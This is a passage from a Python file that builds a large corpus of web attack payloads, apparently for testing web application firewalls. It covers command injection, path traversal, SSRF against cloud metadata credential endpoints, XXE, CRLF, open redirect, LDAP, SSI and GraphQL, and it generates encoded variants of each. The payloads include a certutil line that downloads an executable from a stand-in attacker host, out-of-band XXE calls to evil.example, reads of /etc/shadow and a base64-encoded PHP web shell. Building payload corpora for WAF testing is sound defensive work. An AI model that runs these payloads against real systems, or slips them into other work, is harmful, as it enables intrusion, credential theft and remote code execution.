    "& certutil -urlcache -split -f http://evil.example/x.exe C:\\x.exe",
]

CMDI_ENCODING = [
    ";+id", ";%20id", ";%09id", ";%0aid",
    "%0a id", "%0d%0a id",
    "$(printf '\\x69\\x64')",
    "$'\\x69\\x64'",
    "id$IFS", ";$IFS'id'",
    "i]d", "i${IFS}d",
    ";`echo id`", ";$(echo id)",
    "w`echo h`oami", "w$(echo h)oami",
    "cat$IFS/etc$IFS/passwd",
    "{cat,/etc/passwd}",
    "cat${IFS}/etc/passwd",
    "cat%09/etc/passwd",
    "c'a't /etc/passwd",
    'c"a"t /etc/passwd',
    "c\\at /etc/passwd",
    "/???/??t /???/??????",
]


# ---------------------------------------------------------------------------
# Path Traversal (~200)
# ---------------------------------------------------------------------------

TRAVERSAL_UNIX = [
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../etc/hosts",
    "../../../../etc/hostname",
    "../../../../proc/self/environ",
    "../../../../proc/self/cmdline",
    "../../../../proc/version",
    "../../../../var/log/auth.log",
    "../../../../var/log/apache2/access.log",
    "/etc/passwd",
    "/etc/shadow",
    "/proc/self/environ",
    "/var/www/html/index.php",
]

TRAVERSAL_WINDOWS = [
    "..\\..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..\\..\\..\\..\\windows\\system.ini",
    "..\\..\\..\\..\\boot.ini",
    "C:\\Windows\\win.ini",
    "C:\\Windows\\system.ini",
    "C:\\boot.ini",
]

TRAVERSAL_ENCODING = [
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
    "..%e0%80%af..%e0%80%af..%e0%80%afetc%e0%80%afpasswd",
    "..%25c0%25af..%25c0%25af..%25c0%25afetc%25c0%25afpasswd",
    "..%255c..%255c..%255cetc%255cpasswd",
    "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
    "....//....//....//etc/passwd",
    "....\\\\....\\\\....\\\\etc\\\\passwd",
    "..%00/..%00/..%00/etc/passwd",
    "../../../../etc/passwd%00",
    "../../../../etc/passwd%00.jpg",
    "../../../../etc/passwd%00.html",
    "..%5c..%5c..%5cetc%5cpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..%bg%qf..%bg%qf..%bg%qfetc/passwd",
    "....//....//....//....//etc/passwd",
    "..//..//..//..//etc/passwd",
]


# ---------------------------------------------------------------------------
# SSRF (~200)
# ---------------------------------------------------------------------------

SSRF_CLOUD_META = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    "http://169.254.169.254/latest/api/token",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/",
    "http://metadata.google.internal/computeMetadata/v1/project/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token",
    "http://100.100.100.200/latest/meta-data/",
    "http://169.254.170.2/v2/credentials/",
    "http://[fd00:ec2::254]/latest/meta-data/",
]

SSRF_LOCALHOST = [
    "http://127.0.0.1/",
    "http://127.0.0.1:80/",
    "http://127.0.0.1:443/",
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:3000/",
    "http://localhost/",
    "http://localhost:80/",
    "http://[::1]/",
    "http://[::1]:80/",
    "http://0.0.0.0/",
    "http://0/",
    "http://127.1/",
    "http://127.0.1/",
]

SSRF_IP_ENCODING = [
    "http://2130706433/",
    "http://017700000001/",
    "http://0x7f000001/",
    "http://0x7f.0x00.0x00.0x01/",
    "http://0177.0.0.01/",
    "http://0177.0000.0000.0001/",
    "http://[::ffff:127.0.0.1]/",
    "http://[0:0:0:0:0:ffff:127.0.0.1]/",
    "http://①②⑦.⓪.⓪.①/",
    "http://127.0.0.1.nip.io/",
    "http://localtest.me/",
    "http://spoofed.burpcollaborator.net/",
    "http://0177.1/",
    "http://0x7f.1/",
    "http://2130706433:80/",
]

SSRF_PROTOCOLS = [
    "gopher://127.0.0.1:6379/_SET%20key%20value",
    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:6379/INFO",
    "file:///etc/passwd",
    "file:///etc/hostname",
    "file:///c:/windows/win.ini",
    "ftp://127.0.0.1/",
    "tftp://127.0.0.1/file",
    "ldap://127.0.0.1:389/",
    "ssh://127.0.0.1:22/",
]

SSRF_REDIRECT = [
    "http://evil.example/redirect?url=http://169.254.169.254/",
    "http://evil.example@127.0.0.1/",
    "http://127.0.0.1@evil.example/",
    "http://evil.example#@127.0.0.1/",
    "http://127.0.0.1%23@evil.example/",
    "http://evil.example\\@127.0.0.1/",
    "//evil.example@127.0.0.1/",
    "http://127.0.0.1:80@evil.example/",
]

SSRF_DNS_REBIND = [
    "http://1u.ms/",
    "http://A.169.254.169.254.1u.ms/",
    "http://make-169.254.169.254-rr.1u.ms/",
    "http://rebind.network/",
    "http://rbndr.us/",
    "http://lock.cmpxchg8b.com/",
    "http://r]ebind.it/",
]

SSRF_CLOUD_EXTRA = [
    "http://169.254.169.254/computeMetadata/v1/",
    "http://169.254.169.254/openstack/latest/",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    "http://169.254.169.254/latest/meta-data/hostname",
    "http://169.254.169.254/latest/meta-data/public-keys/",
    "http://169.254.169.254/latest/meta-data/security-groups/",
    "http://169.254.169.254/latest/meta-data/local-ipv4",
    "http://169.254.169.254/latest/meta-data/public-ipv4",
    "http://100.100.100.200/latest/meta-data/instance-id",
    "http://100.100.100.200/latest/meta-data/image-id",
    "http://169.254.170.2/v2/stats",
    "http://[fd00:ec2::254]/latest/meta-data/hostname",
    "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
    "http://metadata.google.internal/computeMetadata/v1/instance/zone",
    "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01",
    "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01",
]


# ---------------------------------------------------------------------------
# XXE (~200)
# ---------------------------------------------------------------------------

XXE_BASIC = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
]

XXE_OOB = [
    '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.example/evil.dtd"> %xxe;]>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.example/evil.dtd"> %xxe;]><foo>bar</foo>',
    '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "ftp://evil.example/evil.dtd"> %xxe;]>',
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.example/?data=file:///etc/passwd">]><foo>&xxe;</foo>',
]

XXE_PHP = [
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://input">]><foo>&xxe;</foo>',
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+">]><foo>&xxe;</foo>',
]

XXE_ADVANCED = [
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xxe;</foo>',
    '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;">]><lolz>&lol4;</lolz>',
    '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="file:///etc/passwd" parse="text"/>',
    '<svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><text>&xxe;</text></svg>',
    '<!DOCTYPE foo [<!ENTITY % a "<!ENTITY &#37; b SYSTEM \'file:///etc/passwd\'>"> %a; %b;]>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<!DOCTYPE foo SYSTEM "data://text/dtd;base64,PCFFTLRUSVRZIGV4ZSBTeVNURU0gImZpbGU6Ly8vZXRjL3Bhc3N3ZCI+">]><foo>&exe;</foo>',
]

XXE_SOAP = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>',
]


# ---------------------------------------------------------------------------
# CRLF Injection (~80)
# ---------------------------------------------------------------------------

CRLF = [
    "%0d%0aSet-Cookie: sessid=injected",
    "%0d%0aLocation: https://evil.example",
    "%0aSet-Cookie: admin=true",
    "%0d%0a%0d%0a<script>alert(1)</script>",
    "%E5%98%8D%E5%98%8ASet-Cookie: crlf=1",
    "%0d%0aRefresh: 0;url=javascript:alert(1)",
    "%250d%250aSet-Cookie: double=encoded",
    "%0d%0aX-Injected: true",
    "%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<html>Injected</html>",
    "\\r\\nSet-Cookie: injected=true",
    "%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>",
    "%0d%0aTransfer-Encoding: chunked%0d%0a%0d%0a0%0d%0a%0d%0a",
    "%0d%0a%0d%0a<img src=x onerror=alert(1)>",
    "%0d%0aAccess-Control-Allow-Origin: *",
    "%0d%0aX-XSS-Protection: 0",
]


# ---------------------------------------------------------------------------
# Open Redirect (~80)
# ---------------------------------------------------------------------------

REDIRECT = [
    "//evil.example", "https://evil.example", "/\\evil.example",
    "https:evil.example", "//trusted.example@evil.example",
    "/%2f%2fevil.example", "javascript:alert(1)",
    "//evil.example/%2f%2e%2e", "///evil.example",
    "////evil.example", "\\/\\/evil.example",
    "/\\/evil.example", "/.evil.example",
    "///\\;@evil.example", "http:///evil.example",
    "https://evil.example/.trusted.example",
    "https://evil.example\\@trusted.example",
    "https://evil.example%40trusted.example",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "%00//evil.example", "%0d%0aLocation: https://evil.example",
    "https://evil.example#.trusted.example",
    "https://evil.example?.trusted.example",
    "//evil%2eexample", "/%2f/evil.example",
    "https://trusted.example.evil.example",
]


# ---------------------------------------------------------------------------
# File Upload extensions (~60)
# ---------------------------------------------------------------------------

UPLOAD = [
    "phtml", "phar", "php", "php3", "php4", "php5", "php7", "php8", "pht",
    "shtml", "asp", "aspx", "jsp", "jspx", "jspf", "cgi", "exe", "svg",
    "html", "htaccess", "asa", "asax", "ashx", "asmx", "cer", "war",
    "shell.php.jpg", "shell.PhP", "shell.php;.jpg", "shell.php%00.jpg",
    "shell.phtml.png", "shell.php.", "shell.php::$DATA", "shell.php%20",
    "shell.aspx;.jpg", "shell.php%0a.jpg",
    "shell.php\\x00.jpg", "shell.php.....",
    "shell.php/.", "shell.php%2e",
]


# ---------------------------------------------------------------------------
# LDAP Injection (~40)
# ---------------------------------------------------------------------------

LDAP = [
    "*)(uid=*))(|(uid=*", "*)(|(password=*))", "*))%00",
    "admin)(&)", "*)(objectClass=*)", "*)(|(cn=*))", "*)(mail=*)",
    "*()|&'", "*)(cn=*))(|(cn=*", "*)(sn=*))",
    "admin)(|(password=*))", "*)(&(objectClass=*))",
    "*)(userPassword=*)", "admin)(!(&(1=0)))",
    "*(|(mail=*))", "*(|(objectclass=*))",
    "admin)(%26)", "*)(description=*)", "*)(telephoneNumber=*)",
    "*)(givenName=*))(|(givenName=*",
    "*(uid=admin)", "*(cn=admin*)",
    "admin)(|(objectClass=inetOrgPerson))",
    "*)(memberOf=*)", "*)(title=*))",
    "admin)(&(1=0))",
]


# ---------------------------------------------------------------------------
# SSI / ESI (~40)
# ---------------------------------------------------------------------------

SSI = [
    '<!--#exec cmd="id"-->', '<!--#exec cmd="cat /etc/passwd"-->',
    '<!--#include virtual="/etc/passwd"-->', '<!--#include file="/etc/passwd"-->',
    '<!--#exec cmd="whoami"-->', '<!--#echo var="DATE_LOCAL"-->',
    '<!--#printenv-->', '<esi:include src="http://evil.example/" />',
    '<esi:include src="http://169.254.169.254/latest/meta-data/" />',
    '<!--#exec cmd="ls -la /"-->', '<!--#exec cmd="env"-->',
    '<!--#config timefmt="%D"-->', '<!--#flastmod virtual="/index.html"-->',
    '<esi:assign name="x"><![CDATA[<script>alert(1)</script>]]></esi:assign>',
]


# ---------------------------------------------------------------------------
# GraphQL (~60)
# ---------------------------------------------------------------------------

GRAPHQL = [
    '{ __schema { queryType { name } types { name fields { name } } } }',
    '{ __type(name: "User") { fields { name type { name } } } }',
    'query { search(q: "\' OR 1=1--") { id } }',
    'mutation { login(email: "\' OR 1=1--", password: "x") { token } }',
    '[{"query":"{ __typename }"},{"query":"{ search(q:\'\' OR 1=1--) { id } }"}]',
    '{ a1: search(q: "\' OR 1=1--") { id } a2: search(q: "\' OR 1=1--") { id } }',
    'query { search(q: "<script>alert(1)</script>") { id } }',
    "{ __schema { types { name kind } } }",
    "{ __schema { directives { name args { name } } } }",
    '{ __type(name: "Query") { name fields { name args { name type { name } } } } }',
    '{ __type(name: "Mutation") { name fields { name args { name type { name } } } } }',
    "query IntrospectionQuery { __schema { queryType { name } mutationType { name } } }",
]


# ---------------------------------------------------------------------------
# WebSocket (~40)
# ---------------------------------------------------------------------------

WEBSOCKET = [
    "42[\"message\",\"' OR 1=1--\"]",
    '42["message","<script>alert(1)</script>"]',
    '42["message","{{7*7}}"]',
    "42[\"chatMessage\",\"' UNION SELECT 1--\"]",
    "42[\"search\",\"' OR 1=1--\"]",
    '42["message","../../../../etc/passwd"]',
    '42["message","; cat /etc/passwd"]',
    '42["message","${7*7}"]',
    '42["message","<img src=x onerror=alert(1)>"]',
    "42[\"message\",\"' AND SLEEP(5)--\"]",
]


# ---------------------------------------------------------------------------
# Assembly
# ---------------------------------------------------------------------------

CORPUS: dict[str, list[str]] = {
    "SQL Injection": (
        SQLI_AUTH_BYPASS + SQLI_UNION + SQLI_BLIND_BOOLEAN + SQLI_BLIND_TIME
        + SQLI_ERROR_BASED + SQLI_STACKED + SQLI_SQLITE + SQLI_MYSQL
        + SQLI_POSTGRESQL + SQLI_MSSQL + SQLI_INLINE_COMMENT + SQLI_ENCODING
        + SQLI_WAF_BYPASS + SQLI_SECOND_ORDER + SQLI_NOSQL
    ),
    "XSS Injection": (
        XSS_BASIC + XSS_TAG_HANDLERS + XSS_SVG + XSS_ENCODING
        + XSS_FILTER_BYPASS + XSS_DOM + XSS_TEMPLATE + XSS_POLYGLOT
        + XSS_WAF_BYPASS + XSS_CSP_BYPASS
    ),
    "SSTI": SSTI_JINJA2 + SSTI_TWIG + SSTI_FREEMARKER + SSTI_OTHER,
    "Command Injection": CMDI_LINUX + CMDI_WINDOWS + CMDI_ENCODING,
    "Directory Traversal": TRAVERSAL_UNIX + TRAVERSAL_WINDOWS + TRAVERSAL_ENCODING,
    "SSRF": (
        SSRF_CLOUD_META + SSRF_CLOUD_EXTRA + SSRF_LOCALHOST + SSRF_IP_ENCODING
        + SSRF_PROTOCOLS + SSRF_REDIRECT + SSRF_DNS_REBIND
    ),
    "XXE Injection": XXE_BASIC + XXE_OOB + XXE_PHP + XXE_ADVANCED + XXE_SOAP,
    "CRLF Injection": CRLF,
    "Open Redirect": REDIRECT,
    "Upload Insecure Files": UPLOAD,
    "LDAP Injection": LDAP,
    "SSI": SSI,
    "GraphQL Injection": GRAPHQL,
    "WebSocket Injection": WEBSOCKET,
}

# ---------------------------------------------------------------------------
# Programmatic expansion — systematic variations that test real WAF edge cases
# ---------------------------------------------------------------------------

def _expand_sqli():
    """Generate SQLi variations by combining quote styles, operators, terminators."""
    quotes = ["'", '"', "')"]
    ops = ["OR", "AND", "OR NOT", "AND NOT", "||", "&&"]
    conds = ["1=1", "'1'='1'", "1 LIKE 1", "1 IN (1)", "1 BETWEEN 0 AND 2",
             "1<2", "2>1", "1!=2", "CHAR(49)=CHAR(49)", "0x1=0x1", "1e0=1e0",
             "NOT 0", "TRUE", "1 IS NOT NULL", "1 GLOB 1"]
    terms = ["--", "-- -", "#", "/*", ";--", ";%00", ""]
    spaces = [" ", "/**/", "%09", "%0a", "%0b", "+"]
    out = []
    for q in quotes:
        for op in ops[:3]:  # just OR, AND, OR NOT
            for cond in conds:
                for term in terms[:3]:  # --, -- -, #
                    out.append(f"{q}{' '}{op}{' '}{cond}{term}")
    # Case variations
    kws = ["UNION SELECT", "union select", "UniOn SeLeCt", "uNiOn SeLeCt"]
    for kw in kws:
        for n in [1, 2, 3, 4, 5]:
            cols = ",".join(["NULL"] * n)
            out.append(f"' {kw} {cols}--")
    # Whitespace variations on OR 1=1
    for s in spaces:
        out.append(f"'{s}OR{s}1=1--")
        out.append(f"'{s}UNION{s}SELECT{s}1,2,3--")
    # Comment inside keywords
    for kw_parts in [("UN","ION"), ("SEL","ECT"), ("ORD","ER"), ("GRO","UP")]:
        a, b = kw_parts
        out.append(f"' {a}/**/{b} SELECT 1--")
        out.append(f"' UNION {a}/**/{b} 1,2,3--")
    return out

def _expand_xss():
    """Generate XSS variations by combining tags, events, and payloads."""
    tags = ["img", "svg", "body", "input", "video", "audio", "details",
            "marquee", "div", "a", "select", "textarea", "iframe",
            "embed", "object", "math", "table", "form", "button",
            "meter", "progress", "dialog", "menu", "fieldset", "output"]
    events = ["onerror", "onload", "onfocus", "onmouseover", "onclick",
              "onmouseenter", "onanimationend", "ontransitionend",
              "onwheel", "onpointerover", "ondragstart", "oncontextmenu",
              "oninput", "onchange", "onsubmit", "onreset", "onselect",
              "onbeforeinput", "onsearch", "ontoggle", "onbeforetoggle"]
    payloads = ["alert(1)", "alert(document.cookie)", "alert(document.domain)",
                "confirm(1)", "prompt(1)", "alert`1`",
                "eval(atob('YWxlcnQoMSk='))"]
    out = []
    for tag in tags:
        for event in events[:5]:  # top 5 events per tag
            for pay in payloads[:3]:  # top 3 payloads
                if tag == "img":
                    out.append(f'<{tag} src=x {event}={pay}>')
                elif tag in ("svg", "body", "marquee", "details"):
                    if event in ("onload", "ontoggle", "onstart"):
                        out.append(f'<{tag} {event}={pay}>')
                else:
                    out.append(f'<{tag} {event}={pay}>')
    # Script tag variations
    for pay in payloads:
        out.append(f'<script>{pay}</script>')
        out.append(f'<ScRiPt>{pay}</ScRiPt>')
        out.append(f'<SCRIPT>{pay}</SCRIPT>')
        out.append(f'<script/>{pay}</script>')
    # javascript: URI variations
    schemes = ["javascript:", "JaVaScRiPt:", "JAVASCRIPT:",
               "javascript\t:", "java\nscript:", "javascript\x00:"]
    for s in schemes:
        out.append(f'<a href="{s}alert(1)">x</a>')
    return out

def _expand_traversal():
    """Generate path traversal with varying depths and encodings."""
    targets_unix = ["/etc/passwd", "/etc/shadow", "/etc/hostname",
                    "/proc/self/environ", "/proc/version",
                    "/var/log/auth.log", "/var/www/html/index.php"]
    targets_win = ["\\windows\\win.ini", "\\windows\\system.ini",
                   "\\boot.ini", "\\windows\\system32\\drivers\\etc\\hosts"]
    encodings = [
        ("../", ""),
        ("..%2f", ""),
        ("..%252f", ""),
        ("%2e%2e%2f", ""),
        ("..%c0%af", ""),
        ("..%e0%80%af", ""),
        ("....//", ""),
        ("..\\", ""),
        ("..%5c", ""),
        ("..%255c", ""),
    ]
    out = []
    for depth in [3, 4, 5, 6, 7, 8]:
        for enc, _ in encodings:
            for t in targets_unix[:4]:
                out.append(enc * depth + t.lstrip("/"))
    for depth in [3, 4, 5, 6]:
        for t in targets_win[:2]:
            out.append("..\\" * depth + t.lstrip("\\"))
    return out

def _expand_ssrf():
    """Generate SSRF with IP encoding variations for key targets."""
    import struct
    targets = [
        ("127.0.0.1", 80),
        ("169.254.169.254", 80),
        ("10.0.0.1", 80),
        ("172.16.0.1", 80),
        ("192.168.1.1", 80),
    ]
    paths = ["/", "/latest/meta-data/", "/admin", "/server-status",
             "/latest/meta-data/iam/security-credentials/"]
    out = []
    for ip, port in targets:
        parts = [int(x) for x in ip.split(".")]
        decimal = struct.unpack("!I", bytes(parts))[0]
        hex_full = "0x" + "".join(f"{p:02x}" for p in parts)
        oct_full = ".".join(f"0{p:o}" for p in parts)
        for path in paths[:2]:
            out.append(f"http://{ip}{path}")
            out.append(f"http://{decimal}{path}")
            out.append(f"http://{hex_full}{path}")
            out.append(f"http://{oct_full}{path}")
            out.append(f"http://[::ffff:{ip}]{path}")
            out.append(f"http://{ip}.nip.io{path}")
    return out

def _expand_cmdi():
    """Generate command injection with separator and encoding variations."""
    seps = [";", "|", "||", "&", "&&", "\n", "%0a", "%0d%0a"]
    cmds = ["id", "whoami", "cat /etc/passwd", "uname -a", "ls -la /",
            "ping -c 4 127.0.0.1", "env", "printenv", "ps aux"]
    out = []
    for sep in seps:
        for cmd in cmds:
            out.append(f"{sep} {cmd}")
            out.append(f"{sep}{cmd}")
    # Command substitution variations
    for cmd in cmds[:5]:
        out.append(f"$({cmd})")
        out.append(f"`{cmd}`")
        out.append(f"${{IFS}}{cmd}")
    return out

def _expand_ssti():
    """Generate SSTI probes for various template engines."""
    # Math probes
    delimiters = [("{{", "}}"), ("${", "}"), ("<%=", "%>"), ("#{", "}"),
                  ("*{", "}"), ("@(", ")"), ("{{=", "}}"), ("{=", "}")]
    exprs = ["7*7", "7*'7'", "7+7", "49", "config", "self", "this",
             "request", "response", "application"]
    out = []
    for open_d, close_d in delimiters:
        for expr in exprs:
            out.append(f"{open_d}{expr}{close_d}")
    # Jinja2 deeper payloads
    jinja_attrs = [
        "config.__class__.__init__.__globals__",
        "request.__class__.__mro__[1]",
        "lipsum.__globals__",
        "cycler.__init__.__globals__",
        "namespace.__init__.__globals__",
        "url_for.__globals__",
        "get_flashed_messages.__globals__",
    ]
    for attr in jinja_attrs:
        out.append("{{" + attr + "}}")
    # Filter chains
    filters = [
        "''|attr('__class__')",
        "()|attr('__class__')|attr('__base__')",
        "config|attr('items')()",
        "''.__class__.__mro__",
        "''.__class__.__mro__[1].__subclasses__()",
    ]
    for f in filters:
        out.append("{{" + f + "}}")
    return out


def _expand_xxe():
    """Generate XXE with various entity types, protocols, and wrappers."""
    protocols = ["file:///etc/passwd", "file:///etc/hostname",
                 "file:///etc/shadow", "file:///proc/self/environ",
                 "file:///c:/windows/win.ini",
                 "http://169.254.169.254/latest/meta-data/",
                 "http://evil.example/xxe",
                 "php://filter/convert.base64-encode/resource=/etc/passwd",
                 "php://filter/convert.base64-encode/resource=index.php",
                 "php://input", "expect://id",
                 "ftp://evil.example/evil.dtd"]
    out = []
    for p in protocols:
        out.append(f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{p}">]><foo>&xxe;</foo>')
        out.append(f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{p}">]><foo>&xxe;</foo>')
        out.append(f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{p}"> %xxe;]>')
    # Encoding variations
    encodings = ["UTF-8", "UTF-16", "ISO-8859-1", "UTF-7"]
    for enc in encodings:
        out.append(f'<?xml version="1.0" encoding="{enc}"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>')
    # XInclude
    for p in protocols[:3]:
        out.append(f'<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="{p}" parse="text"/>')
    # SVG wrapper
    for p in protocols[:3]:
        out.append(f'<svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE svg [<!ENTITY xxe SYSTEM "{p}">]><text>&xxe;</text></svg>')
    return out

def _expand_crlf():
    """Generate CRLF injection with various encoding and header targets."""
    crlfs = ["%0d%0a", "%0a", "%0d", "%E5%98%8D%E5%98%8A",
             "%250d%250a", "\\r\\n", "%c0%8d%c0%8a"]
    headers = [
        "Set-Cookie: admin=true",
        "Set-Cookie: session=hijacked",
        "Location: https://evil.example",
        "X-Injected: true",
        "Access-Control-Allow-Origin: *",
        "X-XSS-Protection: 0",
        "Content-Type: text/html",
        "Content-Security-Policy: default-src *",
        "Refresh: 0;url=https://evil.example",
    ]
    out = []
    for crlf in crlfs:
        for hdr in headers:
            out.append(f"{crlf}{hdr}")
    # Response splitting
    for crlf in crlfs[:3]:
        out.append(f"{crlf}{crlf}<script>alert(1)</script>")
        out.append(f"{crlf}{crlf}<img src=x onerror=alert(1)>")
    return out

def _expand_redirect():
    """Generate open redirect with various bypass techniques."""
    targets = ["evil.example", "attacker.com", "evil.example/phish"]
    out = []
    for t in targets:
        out.append(f"//{t}")
        out.append(f"https://{t}")
        out.append(f"http://{t}")
        out.append(f"/\\{t}")
        out.append(f"///{t}")
        out.append(f"////{t}")
        out.append(f"\\/\\/{t}")
        out.append(f"/{t}")
        out.append(f"/%2f{t}")
        out.append(f"/%2f%2f{t}")
        out.append(f"//{t}%2f%2e%2e")
        out.append(f"//trusted.example@{t}")
        out.append(f"https://{t}@trusted.example")
        out.append(f"https://{t}%40trusted.example")
        out.append(f"https://{t}#.trusted.example")
        out.append(f"https://{t}?.trusted.example")
        out.append(f"https://trusted.example.{t}")
        out.append(f"http:/{t}")
        out.append(f"https:{t}")
        out.append(f"/{t}//")
    return out

def _expand_xss_extra():
    """Additional XSS with mutation, clobbering, and exotic vectors."""
    out = []
    # DOM clobbering
    clobbers = [
        '<form id="x"><input name="y" value="1">',
        '<a id="x" href="javascript:alert(1)">',
        '<form><button formaction="javascript:alert(1)">',
        '<base href="javascript:alert(1)//">',
        '<embed code="javascript:alert(1)">',
    ]
    out.extend(clobbers)
    # Mutation XSS (mXSS)
    mxss = [
        '<math><mtext><table><mglyph><svg><mtext><style><img src onerror=alert(1)>',
        '<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>">',
        '<math><mi><mo><img src=x onerror=alert(1)>',
        '<form><math><mtext><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
    ]
    out.extend(mxss)
    # Exotic event handlers
    exotic_events = [
        "onpointerenter", "onpointerleave", "onpointerdown", "onpointerup",
        "ongotpointercapture", "onlostpointercapture", "onanimationstart",
        "onanimationiteration", "onanimationcancel", "ontransitionstart",
        "ontransitionrun", "ontransitioncancel", "onbeforeinput",
        "onsecuritypolicyviolation", "onslotchange", "onformdata",
    ]
    for ev in exotic_events:
        out.append(f'<div {ev}=alert(1)>test</div>')
        out.append(f'<img src=x {ev}=alert(1)>')
    # Protocol handlers
    protocols = ["javascript:", "data:text/html,", "vbscript:", "livescript:"]
    for proto in protocols:
        out.append(f'<a href="{proto}alert(1)">x</a>')
        out.append(f'<iframe src="{proto}alert(1)">')
    # Backtick variations
    out.extend([
        '<img src=x onerror=alert`1`>',
        '<svg onload=alert`1`>',
        '<img src=x onerror=`alert(1)`>',
        '<div onmouseover=alert`document.cookie`>',
    ])
    # String construction bypasses
    string_bypasses = [
        '<img src=x onerror=top["al"+"ert"](1)>',
        '<img src=x onerror=window["alert"](1)>',
        '<img src=x onerror=self["alert"](1)>',
        '<img src=x onerror=parent["alert"](1)>',
        '<img src=x onerror=frames["alert"](1)>',
        '<img src=x onerror=globalThis["alert"](1)>',
        '<img src=x onerror=Function("alert(1)")()>',
        '<img src=x onerror=setTimeout("alert(1)")>',
        '<img src=x onerror=setInterval("alert(1)")>',
        '<img src=x onerror=requestAnimationFrame(alert)>',
        '<img src=x onerror=queueMicrotask(()=>alert(1))>',
        '<img src=x onerror=Reflect.apply(alert,null,[1])>',
    ]
    out.extend(string_bypasses)
    return out

def _expand_sqli_extra():
    """Additional SQLi with order-by, group-by, and subquery variations."""
    out = []
    # ORDER BY column enumeration
    for n in range(1, 21):
        out.append(f"' ORDER BY {n}--")
        out.append(f"' ORDER BY {n}-- -")
    # GROUP BY / HAVING
    for n in range(1, 10):
        out.append(f"' GROUP BY {n}--")
        out.append(f"' GROUP BY {n} HAVING 1=1--")
    # Subquery injection
    subs = [
        "' AND (SELECT 1)=1--",
        "' AND (SELECT COUNT(*) FROM users)>0--",
        "' AND (SELECT TOP 1 1 FROM users)=1--",
        "' AND 1=(SELECT 1 FROM dual)--",
        "' OR (SELECT 1 FROM users WHERE username='admin')=1--",
        "' UNION SELECT (SELECT version()),NULL--",
